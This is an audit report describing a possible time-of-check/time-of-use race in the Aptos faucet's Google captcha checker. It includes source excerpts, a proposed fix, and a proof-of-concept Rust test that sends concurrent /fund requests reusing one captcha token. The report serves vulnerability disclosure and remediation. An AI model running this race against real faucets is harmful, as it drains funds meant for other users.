# Audit Report

## Title
TOCTOU Vulnerability in Google Captcha Verification Allows Potential Token Reuse for Multiple Fund Disbursements

## Summary
The `GoogleCaptchaChecker` in the Aptos faucet service contains a Time-of-Check-Time-of-Use (TOCTOU) vulnerability where captcha token verification is separated from fund disbursement without any local deduplication mechanism. This allows a race condition where the same captcha token could potentially be used in concurrent requests before Google's API marks it as consumed, bypassing rate limiting and enabling multiple fund disbursements from a single captcha solve.

## Finding Description

The vulnerability exists in the faucet's request processing flow:

**Time-of-Check (TOC):** The captcha token is verified with Google's reCAPTCHA API at: [1](#0-0) 

**Time-of-Use (TOU):** The actual fund disbursement occurs later at: [2](#0-1) 

Between these two points, there is no local tracking or deduplication of captcha tokens. The flow is:

1. Request enters through `/fund` endpoint
2. `preprocess_request()` is called, which runs all checkers: [3](#0-2) 

3. `GoogleCaptchaChecker.check()` verifies the token by calling Google's external API: [4](#0-3) 

4. If successful, the request proceeds to fund disbursement with NO local record that the token was used.

**Critical Flaw:** Unlike the faucet's own `TapCaptchaChecker` implementation, which explicitly prevents reuse by removing used captchas from storage: [5](#0-4) 

The `GoogleCaptchaChecker` has NO such protection. It implements only the `check()` method and does NOT override the `complete()` method to track used tokens: [6](#0-5) 

**Attack Scenario:**
1. Attacker obtains valid captcha token `T1` from Google reCAPTCHA
2. Attacker sends Request A with token `T1` to `/fund` endpoint
3. Before Request A completes, attacker sends Request B with the SAME token `T1`
4. Both requests acquire separate semaphore permits (different requests): [7](#0-6) 

5. Thread A calls Google API to verify `T1` → receives SUCCESS
6. Thread B calls Google API to verify `T1` (concurrently or before Google marks token as used) → may receive SUCCESS
7. Both threads proceed to fund disbursement
8. Result: Double funding from single captcha token

The faucet relies entirely on Google's external API to prevent token reuse, with no local safeguards, violating defense-in-depth principles.

## Impact Explanation

**Severity: HIGH (with caveats)**

This vulnerability falls under the **High Severity** category for the following reasons:

1. **Rate Limiting Bypass**: The captcha mechanism is intended to prevent abuse and ensure one funding per legitimate user interaction. Bypassing this allows attackers to request funds multiple times from a single captcha solve.

2. **Unauthorized Fund Disbursement**: Each successful exploit results in unauthorized fund disbursement beyond intended limits.

3. **Defense-in-Depth Violation**: The code demonstrates that developers understand the need for local deduplication (evidenced by `TapCaptchaChecker`'s implementation), yet this protection is absent in `GoogleCaptchaChecker`.

4. **Resource Exhaustion**: If exploitable, an attacker could drain faucet funds faster than intended by solving one captcha and reusing it in rapid concurrent requests.

**Caveat:** The actual exploitability depends on whether Google's reCAPTCHA API provides atomic deduplication for concurrent verification attempts. Google's API documentation states tokens can only be verified once, but does not explicitly guarantee atomicity under concurrent requests. If Google's API has eventual consistency, there exists a race window where both verifications could succeed.

Even if Google's API prevents exploitation in practice, this remains a **Medium Severity** defense-in-depth issue, as security-critical operations should not rely solely on external services.

## Likelihood Explanation

**Likelihood: MEDIUM**

The likelihood depends on several factors:

1. **Network Latency Window**: Typical API latency to Google's servers (50-200ms) provides a realistic time window for concurrent requests to both call the verification API before either receives a response.

2. **Concurrency Control**: The faucet uses a semaphore to limit concurrent requests, but this does NOT prevent multiple requests with the same captcha token from being processed simultaneously: [8](#0-7) 

3. **Attacker Requirements**: 
   - Solve one captcha (trivial)
   - Send concurrent requests (easily automated with tools like `curl` or HTTP libraries)
   - Timing precision (moderate - requires requests within the API latency window)

4. **Google API Behavior**: The main uncertainty is whether Google's API atomically prevents duplicate verification. This is not documented in the codebase and appears not to be tested.

5. **Proof in Code**: The fact that `TapCaptchaChecker` explicitly implements thread-safe reuse prevention (mutex lock + removal from storage) while `GoogleCaptchaChecker` does not suggests this attack vector was considered for the in-house solution but neglected for the Google integration.

## Recommendation

Implement local deduplication for Google Captcha tokens similar to `TapCaptchaChecker`:

```rust
// In google_captcha.rs, add a token cache
use std::sync::Arc;
use tokio::sync::Mutex;
use std::collections::HashSet;

pub struct CaptchaChecker {
    config: GoogleCaptchaCheckerConfig,
    // Add a cache of recently used tokens (with TTL in production)
    used_tokens: Arc<Mutex<HashSet<String>>>,
}

impl CheckerTrait for CaptchaChecker {
    async fn check(
        &self,
        data: CheckerData,
        _dry_run: bool,
    ) -> Result<Vec<RejectionReason>, AptosTapError> {
        let captcha_token = // ... existing code ...
        
        // Check if token already used (atomic check-and-set)
        {
            let mut used = self.used_tokens.lock().await;
            if used.contains(captcha_token) {
                return Ok(vec![RejectionReason::new(
                    "Captcha token already used".to_string(),
                    RejectionReasonCode::CaptchaInvalid,
                )]);
            }
            // Mark as used BEFORE calling Google API
            used.insert(captcha_token.to_string());
        }
        
        // Verify with Google API
        let verify_result = // ... existing Google API call ...
        
        // If Google API fails, remove from used cache
        if !resp["success"].as_bool().unwrap_or(false) {
            let mut used = self.used_tokens.lock().await;
            used.remove(captcha_token);
            return Ok(vec![RejectionReason::new(
                "Failed to pass captcha check".to_string(),
                RejectionReasonCode::CaptchaInvalid,
            )]);
        }
        
        Ok(vec![])
    }
}
```

**Additional Improvements:**
1. Implement TTL-based eviction for the `used_tokens` cache to prevent memory growth
2. Consider using Redis for distributed deployments (similar to `RedisRatelimitChecker`)
3. Add metrics/logging for duplicate token detection
4. Implement the `complete()` method to clean up tokens on request completion

## Proof of Concept

```rust
// Integration test demonstrating the TOCTOU vulnerability
// Save as: crates/aptos-faucet/core/src/checkers/google_captcha_toctou_test.rs

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Arc;
    use tokio::task::JoinSet;
    
    #[tokio::test]
    async fn test_captcha_token_reuse_vulnerability() {
        // This test demonstrates that without local deduplication,
        // the same captcha token could be verified multiple times concurrently
        
        // Setup: Create mock faucet components with GoogleCaptchaChecker
        // In a real attack, attacker would:
        // 1. Obtain valid captcha token from Google reCAPTCHA
        let valid_token = "VALID_GOOGLE_CAPTCHA_TOKEN";
        
        // 2. Send concurrent requests with same token
        let mut join_set = JoinSet::new();
        
        for i in 0..5 {
            let token = valid_token.to_string();
            join_set.spawn(async move {
                // Send POST request to /fund with same captcha token
                let client = reqwest::Client::new();
                let response = client
                    .post("http://faucet-endpoint/fund")
                    .header("COMPLETED_CAPTCHA_TOKEN", token)
                    .json(&serde_json::json!({
                        "address": format!("0x{:064x}", i),
                        "amount": 100_000_000
                    }))
                    .send()
                    .await;
                response
            });
        }
        
        // 3. Collect results
        let mut successes = 0;
        while let Some(result) = join_set.join_next().await {
            if let Ok(Ok(response)) = result {
                if response.status().is_success() {
                    successes += 1;
                }
            }
        }
        
        // Expected: Only 1 success (if properly protected)
        // Actual: Multiple successes if TOCTOU vulnerability is exploitable
        println!("Successful fund requests with same captcha token: {}", successes);
        
        // In a vulnerable system, this would show successes > 1
        assert!(successes > 1, "TOCTOU vulnerability: multiple requests succeeded with same token");
    }
}
```

**Notes:**
- This PoC requires a running faucet instance with Google Captcha enabled
- Replace the endpoint URL and obtain a real captcha token for live testing
- The actual success rate depends on network timing and Google's API behavior
- A properly protected system should only allow one success per token

---

## Notes

**Key Evidence Supporting This Finding:**

1. **Code Comparison**: The codebase's own `TapCaptchaChecker` implementation explicitly prevents reuse through mutex-protected deduplication, demonstrating that developers understand this security risk but failed to apply it to `GoogleCaptchaChecker`.

2. **No Local Tracking**: The `GoogleCaptchaChecker` implements only the `check()` method and does not override `complete()` for post-verification tracking, meaning there is zero local state about used tokens.

3. **External Dependency**: The code relies entirely on Google's external API with no documentation or testing of its atomicity guarantees under concurrent load.

4. **TOCTOU Pattern**: Clear separation between verification (check) and usage (fund) with no atomic operation linking them.

This is a textbook TOCTOU vulnerability compounded by insufficient defense-in-depth. Even if Google's API provides some protection, security-critical operations should never rely solely on external services without local safeguards.

### Citations

**File:** crates/aptos-faucet/core/src/checkers/google_captcha.rs (L58-126)
```rust
#[async_trait]
impl CheckerTrait for CaptchaChecker {
    async fn check(
        &self,
        data: CheckerData,
        _dry_run: bool,
    ) -> Result<Vec<RejectionReason>, AptosTapError> {
        let captcha_token = match data.headers.get(COMPLETED_CAPTCHA_TOKEN) {
            Some(header_value) => header_value.to_str().map_err(|e| {
                AptosTapError::new_with_error_code(e, AptosTapErrorCode::InvalidRequest)
            })?,
            None => {
                return Ok(vec![RejectionReason::new(
                    format!("Captcha header {} not found", COMPLETED_CAPTCHA_TOKEN),
                    RejectionReasonCode::CaptchaInvalid,
                )])
            },
        };

        let verify_result = reqwest::Client::new()
            .post(GOOGLE_CAPTCHA_ENDPOINT)
            // Google captcha API only accepts form encoded payload, lol
            .form::<VerifyRequest>(&VerifyRequest {
                secret: self.config.google_captcha_api_key.0.clone(),
                response: captcha_token.to_string(),
                remoteip: data.source_ip.to_string(),
            })
            .send()
            .await
            .map_err(|e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError))?;

        let status_code = verify_result.status();
        let resp = verify_result
            .text()
            .await
            .map_err(|e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError))?;
        if !status_code.is_success() {
            debug!(
                message = "Google captcha API returned error status code",
                status = status_code.as_str(),
                resp = resp
            );
        } else {
            // Rather than `verify_result.json`, we parse the result with serde_json to have more flexibilities
            let resp: serde_json::Value = serde_json::from_str(resp.as_str()).map_err(|e| {
                AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError)
            })?;

            if resp["success"].as_bool().unwrap_or(false) {
                return Ok(vec![]);
            } else {
                debug!(
                    message = "Invalid captcha token",
                    source_ip = data.source_ip,
                    resp = resp
                );
            }
        };

        Ok(vec![RejectionReason::new(
            "Failed to pass captcha check".to_string(),
            RejectionReasonCode::CaptchaInvalid,
        )])
    }

    fn cost(&self) -> u8 {
        10
    }
}
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L186-187)
```rust
    pub concurrent_requests_semaphore: Option<Arc<Semaphore>>,
}
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L204-215)
```rust
        let permit = match &self.concurrent_requests_semaphore {
            Some(semaphore) => match semaphore.try_acquire() {
                Ok(permit) => Some(permit),
                Err(_) => {
                    return Err(AptosTapError::new(
                        "Server overloaded, please try again later".to_string(),
                        AptosTapErrorCode::ServerOverloaded,
                    ))
                },
            },
            None => None,
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L263-270)
```rust
        for checker in &self.checkers {
            rejection_reasons.extend(checker.check(checker_data.clone(), dry_run).await.map_err(
                |e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError),
            )?);
            if !rejection_reasons.is_empty() && self.return_rejections_early {
                break;
            }
        }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L300-309)
```rust
        let fund_result = self
            .funder
            .fund(
                fund_request.amount,
                checker_data.receiver,
                asset,
                false,
                bypass,
            )
            .await;
```

**File:** crates/aptos-faucet/core/src/checkers/tap_captcha.rs (L165-177)
```rust
    pub fn check_challenge(&mut self, key: u32, value: &str) -> Result<bool> {
        match self.challenges.get(&key) {
            Some(captcha) => {
                if captcha == value {
                    self.challenges.remove(&key);
                    Ok(true)
                } else {
                    Ok(false)
                }
            },
            None => bail!("Captcha key unknown: {}", key),
        }
    }
```
